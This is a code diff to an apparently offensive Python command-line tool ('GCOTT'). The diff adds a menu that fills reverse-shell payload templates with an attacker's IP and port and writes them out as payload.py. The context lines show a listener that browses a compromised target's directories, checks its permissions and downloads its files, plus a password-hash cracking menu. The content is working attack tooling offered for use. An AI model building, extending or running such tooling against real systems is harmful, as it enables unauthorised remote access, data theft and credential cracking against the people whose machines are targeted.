@@ -23,6 +23,35 @@ def help():
     print("-h/help: Show all option that you can use\nshow: Show all settings of connection\n-g/generate: Show generating payload menu\nset [OPTION_NAME]: set the option of connection\n-l/listen: Show listening optiion\nrun/execute: execute")
 def listen_help():
     print("info: get information about target\ncwd: get current directory\nls: list directory\ncd: change directory EX: cd ../ cd [directory_name]\nuser: show user pemission\nget [File_Name]: get the file from target\n")
+def payload_help():
+    print("-l: List to All Payloads\nset [Payload_Name]/[Payload_Option]: set the payload(Ex. set reverseShell.py / set host_ip 1.1.1.1)\nshow: shows the payload options(eg: ip,port)\n-g/generate: generates payload with options\n-q/quit: quit the payload menu")
+
+def set_payload(payload_name):
+    payloads = os.listdir("payloads")
+    full_name = ""
+    payload = ""
+    for i in payloads:
+        if payload_name == i.split(".")[0]:
+            payload = i.split(".")[0]
+            full_name = i
+            break
+    with open("payloads/"+full_name,"r") as file:
+        edited_payload = file.readlines()
+    return payload,full_name,edited_payload
+
+
+def set_option(option_name,option_value,edited_payload):
+    if option_name == "ip":
+        print("icerde")
+        for i in edited_payload:
+            if "Host_ip =" in i:
+                edited_payload[edited_payload.index(i)] = f'Host_ip = "{option_value}"\n'
+    elif option_name == "port":
+        for i in edited_payload:
+            if "Host_port =" in i:
+                edited_payload[edited_payload.index(i)] = f'Host_port = {int(option_value)}\n'
+    return edited_payload
+
 def get_file(file_name):
     with open(file_name,"wb") as file:
         data=b''
@@ -33,6 +62,12 @@ def get_file(file_name):
                 break
             data+=batchs
         file.write(data)
+def print_dir(list_dir):
+    for i in list_dir:
+        rShell = i.split(".")
+        if rShell[1]=="py":
+            python_sign = colored("Python","green")
+            print(python_sign," => ",rShell[0])
 
 at_sign = colored("@","green")
 quit_status = 0
@@ -49,6 +84,8 @@ while True:
     if chapter =="listen" or chapter ==  "-l":
         host_ip = socket.gethostbyname(socket.gethostname())
         host_port = 5555
+        print("\nListening Mode Activate on ",host_ip,":",host_port)
+        print("You can change the host ip and port with set option and then execute\n")
         while True:  
             option = input("GCOTT -> ")
             if option == "show":
@@ -110,6 +147,8 @@ while True:
                         elif command == "q" or command == "quit":
                             target_connection.close()
                             break
+            elif option == "q" or option == "quit":
+                    break
     elif chapter =="password" or chapter == "-p":
         hashed_password = input("Enter the hashed password: ")
         password_list_path = input("Enter the password list path: ")
@@ -118,5 +157,51 @@ while True:
         cracker = Password_Cracker(hashed_password,password_list_path,hash_type,randomness)
         result = cracker.crack()
         print("Password => ",result)
+
+    elif chapter == "generate" or chapter == "-g":
+        payload_sign = colored("Payload","red")
+        while True:
+            user_input = input("GCOTT@"+payload_sign+" -> ")
+            if(user_input=="help" or user_input=="-h"):
+                payload_help()
+            elif user_input == "quit" or user_input == "q":
+                break
+            elif user_input == "list" or user_input == "-l":
+                print("\nPayloads:")
+                payloads = os.listdir("payloads")
+                print_dir(payloads)
+                print("\n")
+            elif "set" in user_input:
+                host_ip=""
+                host_port=5555
+                edited_payload = []
+                payload_name = user_input.split(" ")[1]
+                payload,full_name,edited_payload = set_payload(payload_name)
+                payload_name_sign = colored(payload_name,"red")
+                while True:
+                    payload_input = input("GCOTT@"+payload_name_sign+" -> ")
+                    if payload_input == "show":
+                        print("\n--------------------------\nPayload Name: ",payload_name,"\n--------------------------\nPayload Options: \n")
+                        print("Host_ip: ",host_ip,"\n--------------------------\nHost_port: ",host_port,"\n--------------------------\n")
+                    elif "set" in payload_input:
+                        option_name = payload_input.split(" ")[1].split("_")[1].lower()
+                        option_value = payload_input.split(" ")[2]
+                        edited_payload = set_option(option_name,option_value,edited_payload)
+                        if option_name == "ip":
+                            host_ip = option_value
+                        elif option_name == "port":
+                            host_port = option_value
+                    elif payload_input == "generate" or payload_input == "-g":
+                        with open("payload.py","w") as file:
+                            for i in edited_payload:
+                                file.write(i)
+                        print("Payload Generated")
+                    elif payload_input == "q" or payload_input == "quit":
+                        break
+
+
+    elif chapter == "q" or chapter == "quit":
+        print("Quiting...")
+        break
 
 #target_connection.close()
